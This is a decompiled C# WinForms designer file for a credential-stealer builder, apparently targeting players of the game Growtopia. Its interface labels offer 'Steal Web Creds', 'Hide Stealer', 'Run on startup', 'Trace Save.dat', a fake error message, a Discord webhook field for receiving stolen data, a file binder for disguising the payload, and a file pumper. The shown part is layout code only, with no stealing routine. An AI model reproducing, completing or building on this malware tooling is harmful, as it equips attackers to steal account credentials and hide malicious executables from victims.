			this.groupBox2.BackColor = Color.Black;
			this.groupBox2.Controls.Add(this.fakeerrormessage);
			this.groupBox2.Controls.Add(this.metroCheckBox6);
			this.groupBox2.Controls.Add(this.metroCheckBox3);
			this.groupBox2.Controls.Add(this.metroCheckBox4);
			this.groupBox2.Controls.Add(this.metroCheckBox2);
			this.groupBox2.Controls.Add(this.metroCheckBox5);
			this.groupBox2.Controls.Add(this.metroCheckBox1);
			this.groupBox2.Font = new Font("Microsoft Sans Serif", 11.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.groupBox2.ForeColor = Color.White;
			this.groupBox2.Location = new Point(18, 191);
			this.groupBox2.Name = "groupBox2";
			this.groupBox2.Size = new Size(431, 151);
			this.groupBox2.TabIndex = 4;
			this.groupBox2.TabStop = false;
			this.groupBox2.Text = "Features";
			this.fakeerrormessage.Location = new Point(15, 118);
			this.fakeerrormessage.Name = "fakeerrormessage";
			this.fakeerrormessage.Size = new Size(124, 23);
			this.fakeerrormessage.Style = 3;
			this.fakeerrormessage.TabIndex = 40;
			this.fakeerrormessage.Text = "Fake Error Message";
			this.fakeerrormessage.Theme = 2;
			this.fakeerrormessage.UseStyleColors = true;
			this.fakeerrormessage.Click += this.fakeerrormessage_Click_1;
			this.metroCheckBox6.AutoSize = true;
			this.metroCheckBox6.Cursor = Cursors.Hand;
			this.metroCheckBox6.Location = new Point(152, 46);
			this.metroCheckBox6.Name = "metroCheckBox6";
			this.metroCheckBox6.Size = new Size(108, 15);
			this.metroCheckBox6.TabIndex = 35;
			this.metroCheckBox6.Text = "Steal Web Creds";
			this.metroCheckBox6.Theme = 2;
			this.metroCheckBox6.UseVisualStyleBackColor = true;
			this.metroCheckBox3.AutoSize = true;
			this.metroCheckBox3.Cursor = Cursors.Hand;
			this.metroCheckBox3.Location = new Point(152, 21);
			this.metroCheckBox3.Name = "metroCheckBox3";
			this.metroCheckBox3.Size = new Size(101, 15);
			this.metroCheckBox3.TabIndex = 34;
			this.metroCheckBox3.Text = "Run on startup";
			this.metroCheckBox3.Theme = 2;
			this.metroCheckBox3.UseVisualStyleBackColor = true;
			this.metroCheckBox4.AutoSize = true;
			this.metroCheckBox4.Cursor = Cursors.Hand;
			this.metroCheckBox4.Location = new Point(16, 97);
			this.metroCheckBox4.Name = "metroCheckBox4";
			this.metroCheckBox4.Size = new Size(124, 15);
			this.metroCheckBox4.TabIndex = 33;
			this.metroCheckBox4.Text = "Fake Error Message";
			this.metroCheckBox4.Theme = 2;
			this.metroCheckBox4.UseVisualStyleBackColor = true;
			this.metroCheckBox4.CheckedChanged += this.metroCheckBox1_CheckedChanged;
			this.metroCheckBox2.AutoSize = true;
			this.metroCheckBox2.Cursor = Cursors.Hand;
			this.metroCheckBox2.Location = new Point(16, 72);
			this.metroCheckBox2.Name = "metroCheckBox2";
			this.metroCheckBox2.Size = new Size(97, 15);
			this.metroCheckBox2.TabIndex = 32;
			this.metroCheckBox2.Text = "Trace Save.dat";
			this.metroCheckBox2.Theme = 2;
			this.metroCheckBox2.UseVisualStyleBackColor = true;
			this.metroCheckBox2.CheckedChanged += this.metroCheckBox2_CheckedChanged;
			this.metroCheckBox5.AutoSize = true;
			this.metroCheckBox5.Cursor = Cursors.Hand;
			this.metroCheckBox5.Location = new Point(16, 46);
			this.metroCheckBox5.Name = "metroCheckBox5";
			this.metroCheckBox5.Size = new Size(114, 15);
			this.metroCheckBox5.TabIndex = 31;
			this.metroCheckBox5.Text = "Delete Growtopia";
			this.metroCheckBox5.Theme = 2;
			this.metroCheckBox5.UseVisualStyleBackColor = true;
			this.metroCheckBox1.AutoSize = true;
			this.metroCheckBox1.Cursor = Cursors.Hand;
			this.metroCheckBox1.Location = new Point(16, 21);
			this.metroCheckBox1.Name = "metroCheckBox1";
			this.metroCheckBox1.Size = new Size(86, 15);
			this.metroCheckBox1.TabIndex = 30;
			this.metroCheckBox1.Text = "Hide Stealer";
			this.metroCheckBox1.Theme = 2;
			this.metroCheckBox1.UseVisualStyleBackColor = true;
			this.metroLabel1.AutoSize = true;
			this.metroLabel1.BackColor = Color.Black;
			this.metroLabel1.FontWeight = 1;
			this.metroLabel1.ForeColor = Color.White;
			this.metroLabel1.Location = new Point(52, 33);
			this.metroLabel1.Name = "metroLabel1";
			this.metroLabel1.Size = new Size(120, 19);
			this.metroLabel1.TabIndex = 32;
			this.metroLabel1.Text = "Discord Webhook:";
			this.metroLabel1.Theme = 2;
			this.metroLabel1.UseStyleColors = true;
			this.pictureBox4.BackColor = Color.FromArgb(17, 17, 17);
			this.pictureBox4.BorderStyle = BorderStyle.FixedSingle;
			this.pictureBox4.Location = new Point(702, 85);
			this.pictureBox4.Name = "pictureBox4";
			this.pictureBox4.Size = new Size(80, 80);
			this.pictureBox4.TabIndex = 29;
			this.pictureBox4.TabStop = false;
			this.Binder.Controls.Add(this.bindfiles);
			this.Binder.Controls.Add(this.removebindfiles);
			this.Binder.Controls.Add(this.bindlist);
			this.Binder.Controls.Add(this.metroLabel4);
			this.Binder.Controls.Add(this.metroTextBox3);
			this.Binder.HorizontalScrollbarBarColor = true;
			this.Binder.Location = new Point(4, 35);
			this.Binder.Name = "Binder";
			this.Binder.Size = new Size(819, 383);
			this.Binder.Style = 3;
			this.Binder.TabIndex = 2;
			this.Binder.Text = "     Binder     ";
			this.Binder.Theme = 2;
			this.Binder.VerticalScrollbarBarColor = true;
			this.Binder.Click += this.Binder_Click;
			this.bindlist.BackColor = Color.Black;
			this.bindlist.Columns.AddRange(new ColumnHeader[]
			{
				this.columnHeader1
			});
			this.bindlist.ForeColor = Color.White;
			this.bindlist.HideSelection = false;
			this.bindlist.Location = new Point(100, 49);
			this.bindlist.Name = "bindlist";
			this.bindlist.Size = new Size(682, 238);
			this.bindlist.TabIndex = 36;
			this.bindlist.UseCompatibleStateImageBehavior = false;
			this.bindlist.View = View.Details;
			this.bindlist.SelectedIndexChanged += this.bindlist_SelectedIndexChanged;
			this.columnHeader1.Text = "File";
			this.columnHeader1.Width = 678;
			this.metroLabel4.AutoSize = true;
			this.metroLabel4.BackColor = Color.Black;
			this.metroLabel4.FontWeight = 1;
			this.metroLabel4.ForeColor = Color.White;
			this.metroLabel4.Location = new Point(4, 357);
			this.metroLabel4.Name = "metroLabel4";
			this.metroLabel4.Size = new Size(56, 19);
			this.metroLabel4.TabIndex = 35;
			this.metroLabel4.Text = "License:";
			this.metroLabel4.Theme = 2;
			this.metroLabel4.UseStyleColors = true;
			this.metroTextBox3.Enabled = false;
			this.metroTextBox3.Location = new Point(60, 357);
			this.metroTextBox3.Name = "metroTextBox3";
			this.metroTextBox3.PasswordChar = '●';
			this.metroTextBox3.ReadOnly = true;
			this.metroTextBox3.Size = new Size(118, 23);
			this.metroTextBox3.Style = 3;
			this.metroTextBox3.TabIndex = 34;
			this.metroTextBox3.Text = "Licensenumberlol";
			this.metroTextBox3.Theme = 2;
			this.metroTextBox3.UseStyleColors = true;
			this.metroTextBox3.UseSystemPasswordChar = true;
			this.Pumper.Controls.Add(this.metroLabel6);
			this.Pumper.Controls.Add(this.metroButton4);
			this.Pumper.Controls.Add(this.numericUpDown1);
			this.Pumper.Controls.Add(this.metroLabel5);
			this.Pumper.Controls.Add(this.metroTextBox6);
			this.Pumper.Controls.Add(this.groupBox3);
			this.Pumper.HorizontalScrollbarBarColor = true;
			this.Pumper.Location = new Point(4, 35);
			this.Pumper.Name = "Pumper";
			this.Pumper.Size = new Size(819, 383);
			this.Pumper.Style = 3;
			this.Pumper.TabIndex = 3;
			this.Pumper.Text = "     Pumper     ";
			this.Pumper.Theme = 2;
			this.Pumper.VerticalScrollbarBarColor = true;
			this.Pumper.Click += this.Pumper_Click;
			this.metroLabel6.AutoSize = true;
			this.metroLabel6.BackColor = Color.Black;
			this.metroLabel6.FontWeight = 1;
			this.metroLabel6.ForeColor = Color.White;
			this.metroLabel6.Location = new Point(135, 190);
			this.metroLabel6.Name = "metroLabel6";
			this.metroLabel6.Size = new Size(120, 19);
			this.metroLabel6.TabIndex = 44;
			this.metroLabel6.Text = "Amount To Bump:";
			this.metroLabel6.Theme = 2;
			this.metroLabel6.UseStyleColors = true;
			this.metroButton4.Cursor = Cursors.Hand;
			this.metroButton4.Highlight = true;
			this.metroButton4.Location = new Point(704, 337);
			this.metroButton4.Name = "metroButton4";
			this.metroButton4.Size = new Size(106, 39);
			this.metroButton4.TabIndex = 41;
			this.metroButton4.Text = "Pump File";
			this.metroButton4.Theme = 2;
			this.metroButton4.Click += this.metroButton4_Click_1;
			this.numericUpDown1.BackColor = Color.Black;
			this.numericUpDown1.ForeColor = Color.White;
			this.numericUpDown1.Location = new Point(135, 217);
			NumericUpDown numericUpDown = this.numericUpDown1;
			int[] array = new int[4];
			array[0] = 99999;
			numericUpDown.Maximum = new decimal(array);
			this.numericUpDown1.Name = "numericUpDown1";
			this.numericUpDown1.Size = new Size(432, 20);
			this.numericUpDown1.TabIndex = 38;
			this.metroLabel5.AutoSize = true;
			this.metroLabel5.BackColor = Color.Black;
			this.metroLabel5.FontWeight = 1;
			this.metroLabel5.ForeColor = Color.White;
			this.metroLabel5.Location = new Point(4, 357);
			this.metroLabel5.Name = "metroLabel5";
			this.metroLabel5.Size = new Size(56, 19);
			this.metroLabel5.TabIndex = 36;
			this.metroLabel5.Text = "License:";
			this.metroLabel5.Theme = 2;
			this.metroLabel5.UseStyleColors = true;
			this.metroTextBox6.Enabled = false;
			this.metroTextBox6.Location = new Point(60, 357);
			this.metroTextBox6.Name = "metroTextBox6";
			this.metroTextBox6.PasswordChar = '●';
			this.metroTextBox6.ReadOnly = true;
			this.metroTextBox6.Size = new Size(118, 23);
			this.metroTextBox6.Style = 3;
			this.metroTextBox6.TabIndex = 35;
			this.metroTextBox6.Text = "Licensenumberlol";
			this.metroTextBox6.Theme = 2;
			this.metroTextBox6.UseStyleColors = true;
			this.metroTextBox6.UseSystemPasswordChar = true;
			this.groupBox3.BackColor = Color.Black;
			this.groupBox3.Controls.Add(this.bunifuCheckbox1);
			this.groupBox3.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.groupBox3.ForeColor = Color.White;
			this.groupBox3.Location = new Point(135, 131);
			this.groupBox3.Name = "groupBox3";
			this.groupBox3.Size = new Size(102, 46);
			this.groupBox3.TabIndex = 43;
			this.groupBox3.TabStop = false;
			this.groupBox3.Text = "Methode";
			this.groupBox3.Enter += this.groupBox3_Enter_1;
			this.bunifuCheckbox1.AutoSize = true;
			this.bunifuCheckbox1.Location = new Point(11, 23);
			this.bunifuCheckbox1.Name = "bunifuCheckbox1";
			this.bunifuCheckbox1.Size = new Size(41, 15);
			this.bunifuCheckbox1.TabIndex = 40;
			this.bunifuCheckbox1.Text = "MB";
			this.bunifuCheckbox1.Theme = 2;
			this.bunifuCheckbox1.UseVisualStyleBackColor = true;
			this.bunifuCheckbox1.CheckedChanged += this.bunifuCheckbox1_CheckedChanged;
			this.Proxy.HorizontalScrollbarBarColor = true;
			this.Proxy.Location = new Point(4, 35);
			this.Proxy.Name = "Proxy";
			this.Proxy.Size = new Size(819, 383);
			this.Proxy.TabIndex = 4;
			this.Proxy.Text = "     Proxy     ";
			this.Proxy.Theme = 2;
			this.Proxy.VerticalScrollbarBarColor = true;
			this.metroButton1.Location = new Point(831, 5);
			this.metroButton1.Name = "metroButton1";
			this.metroButton1.Size = new Size(42, 23);
			this.metroButton1.TabIndex = 2;
			this.metroButton1.Text = "X";
			this.metroButton1.Theme = 2;
			this.metroButton1.Click += this.metroButton1_Click;
			this.metroButton2.Location = new Point(789, 5);
			this.metroButton2.Name = "metroButton2";
			this.metroButton2.Size = new Size(42, 23);
			this.metroButton2.TabIndex = 3;
			this.metroButton2.Text = "_";
			this.metroButton2.Theme = 2;
			this.metroButton2.Click += this.metroButton2_Click;
			this.openFileDialog.FileName = "openFileDialog2";
			this.openFileDialog.FileOk += this.openFileDialog_FileOk;
			this.label3.BackColor = Color.Transparent;
			this.label3.Cursor = Cursors.IBeam;
			this.label3.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.label3.ForeColor = Color.Red;
			this.label3.Location = new Point(826, 456);
			this.label3.Name = "label3";
			this.label3.Size = new Size(53, 22);
			this.label3.TabIndex = 69;
			this.label3.Text = "V4.1";
			this.label3.TextAlign = ContentAlignment.MiddleCenter;
			this.openFileDialog1.FileName = "openFileDialog1";
			this.openFileDialog1.FileOk += this.openFileDialog1_FileOk_1;
			this.removebindfiles.Cursor = Cursors.Hand;
			this.removebindfiles.Highlight = true;
			this.removebindfiles.Location = new Point(448, 293);
			this.removebindfiles.Name = "removebindfiles";
			this.removebindfiles.Size = new Size(334, 23);
			this.removebindfiles.Style = 3;
			this.removebindfiles.TabIndex = 38;
			this.removebindfiles.Text = "Remove Files";
			this.removebindfiles.Theme = 2;
			this.removebindfiles.Click += this.removebindfiles_Click;
			this.bindfiles.Cursor = Cursors.Hand;
			this.bindfiles.Highlight = true;
			this.bindfiles.Location = new Point(100, 293);
			this.bindfiles.Name = "bindfiles";
			this.bindfiles.Size = new Size(334, 23);
			this.bindfiles.Style = 3;
			this.bindfiles.TabIndex = 39;
			this.bindfiles.Text = "Add Files To Bind";
			this.bindfiles.Theme = 2;
			this.bindfiles.Click += this.bindfiles_Click;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			base.ClientSize = new Size(873, 478);
			base.Controls.Add(this.label3);
			base.Controls.Add(this.metroButton2);
			base.Controls.Add(this.metroButton1);
			base.Controls.Add(this.metroTabControl1);
			base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			base.Name = "Main";
			base.Resizable = false;
			base.Theme = 2;
			base.Load += this.Form2_Load;
			this.metroTabControl1.ResumeLayout(false);
			this.Home.ResumeLayout(false);
			this.Home.PerformLayout();
			this.groupBox1.ResumeLayout(false);
			((ISupportInitialize)this.pictureBox3).EndInit();
			((ISupportInitialize)this.pictureBox2).EndInit();
			((ISupportInitialize)this.pictureBox1).EndInit();
			this.Builder.ResumeLayout(false);
			this.Builder.PerformLayout();
			this.groupBox2.ResumeLayout(false);
			this.groupBox2.PerformLayout();
			((ISupportInitialize)this.pictureBox4).EndInit();
			this.Binder.ResumeLayout(false);
			this.Binder.PerformLayout();
			this.Pumper.ResumeLayout(false);
			this.Pumper.PerformLayout();
			((ISupportInitialize)this.numericUpDown1).EndInit();
			this.groupBox3.ResumeLayout(false);
			this.groupBox3.PerformLayout();
			base.ResumeLayout(false);
		}

		// Token: 0x0400000E RID: 14
		private IContainer components = null;

		// Token: 0x0400000F RID: 15
		private MetroTabControl metroTabControl1;

		// Token: 0x04000010 RID: 16
		private MetroTabPage Home;

		// Token: 0x04000011 RID: 17
		private MetroTabPage Builder;

		// Token: 0x04000012 RID: 18
		private MetroTabPage Binder;

		// Token: 0x04000013 RID: 19
		private MetroButton metroButton1;

		// Token: 0x04000014 RID: 20
		private MetroButton metroButton2;

		// Token: 0x04000015 RID: 21
		private GroupBox groupBox1;

		// Token: 0x04000016 RID: 22
		private PictureBox pictureBox1;

		// Token: 0x04000017 RID: 23
		private PictureBox pictureBox2;

		// Token: 0x04000018 RID: 24
		private PictureBox pictureBox3;

		// Token: 0x04000019 RID: 25
		private MetroButton metroButton3;

		// Token: 0x0400001A RID: 26
		private GroupBox groupBox2;

		// Token: 0x0400001B RID: 27
		private SaveFileDialog saveFileDialog1;

		// Token: 0x0400001C RID: 28
		private MetroCheckBox metroCheckBox4;

		// Token: 0x0400001D RID: 29
		private MetroCheckBox metroCheckBox2;

		// Token: 0x0400001E RID: 30
		private MetroCheckBox metroCheckBox5;

		// Token: 0x0400001F RID: 31
		private MetroCheckBox metroCheckBox1;

		// Token: 0x04000020 RID: 32
		private PictureBox pictureBox4;

		// Token: 0x04000021 RID: 33
		private MetroLabel metroLabel10;

		// Token: 0x04000022 RID: 34
		private MetroTextBox metroTextBox7;

		// Token: 0x04000023 RID: 35
		private MetroLabel metroLabel9;

		// Token: 0x04000024 RID: 36
		private MetroButton metroButton5;

		// Token: 0x04000025 RID: 37
		private MetroCheckBox metroCheckBox3;

		// Token: 0x04000026 RID: 38
		private MetroLabel metroLabel1;

		// Token: 0x04000027 RID: 39
		private MetroCheckBox metroCheckBox6;

		// Token: 0x04000028 RID: 40
		private MetroTextBox metroTextBox1;

		// Token: 0x04000029 RID: 41
		private MetroLabel metroLabel2;

		// Token: 0x0400002A RID: 42
		private MetroLabel metroLabel3;

		// Token: 0x0400002B RID: 43
		private MetroTextBox metroTextBox2;

		// Token: 0x0400002C RID: 44
		private MetroLabel metroLabel4;

		// Token: 0x0400002D RID: 45
		private MetroTextBox metroTextBox3;

		// Token: 0x0400002E RID: 46
		private MetroTabPage Pumper;

		// Token: 0x0400002F RID: 47
		private MetroLabel metroLabel5;

		// Token: 0x04000030 RID: 48
		private MetroTextBox metroTextBox6;

		// Token: 0x04000031 RID: 49
		private MetroLabel metroLabel6;

		// Token: 0x04000032 RID: 50
		private MetroButton metroButton4;

		// Token: 0x04000033 RID: 51
		private NumericUpDown numericUpDown1;

		// Token: 0x04000034 RID: 52
		private GroupBox groupBox3;

		// Token: 0x04000035 RID: 53
		private MetroCheckBox bunifuCheckbox1;

		// Token: 0x04000036 RID: 54
		private MetroTextBox fakeerrormessage;

		// Token: 0x04000037 RID: 55
		private Label label1;

		// Token: 0x04000038 RID: 56
		private MetroComboBox metroComboBox1;

		// Token: 0x04000039 RID: 57
		private MetroTabPage Proxy;

		// Token: 0x0400003A RID: 58
		private OpenFileDialog openFileDialog;

		// Token: 0x0400003B RID: 59
		private Label label3;

		// Token: 0x0400003C RID: 60
		private OpenFileDialog openFileDialog1;

		// Token: 0x0400003D RID: 61
		private MetroTextBox Webhook;

		// Token: 0x0400003E RID: 62
		private ListView bindlist;

		// Token: 0x0400003F RID: 63
		private ColumnHeader columnHeader1;

		// Token: 0x04000040 RID: 64
		private MetroButton removebindfiles;

		// Token: 0x04000041 RID: 65
		private MetroButton bindfiles;
	}
}
